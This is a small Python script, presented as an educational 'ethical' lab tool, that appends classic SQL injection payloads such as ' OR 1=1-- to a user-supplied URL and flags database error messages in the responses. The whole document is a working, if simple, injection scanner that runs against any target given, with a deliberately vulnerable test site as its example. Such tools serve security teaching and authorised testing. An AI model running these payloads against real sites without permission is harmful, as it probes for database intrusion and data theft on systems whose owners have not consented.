import requests
import sys

print("""
========================================
      ETHICAL CYBER LAB - SQLi TEST
========================================
Educational SQL Injection vulnerability tester
Author: Divine Sunday OFUOWOICHO
========================================
""")

# Basic SQL injection payloads
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "' OR ''='",
    "' OR 1=1#"
]

if len(sys.argv) != 2:
    print("Usage: python3 sqli_test.py <target_url>")
    print("Example: python3 sqli_test.py http://testphp.vulnweb.com/listproducts.php?cat=1")
    sys.exit()

url = sys.argv[1]

print(f"\n[+] Testing target: {url}\n")

for payload in payloads:

    test_url = url + payload

    try:
        response = requests.get(test_url, timeout=5)

        errors = [
            "sql syntax",
            "mysql",
            "syntax error",
            "warning",
            "unterminated",
            "odbc"
        ]

        for error in errors:
            if error in response.text.lower():
                print(f"[!] Possible SQL Injection vulnerability detected!")
                print(f"[!] Payload: {payload}")
                print(f"[!] URL: {test_url}\n")
                break

    except requests.exceptions.RequestException:
        print("[-] Connection error")

print("\nScan complete.")
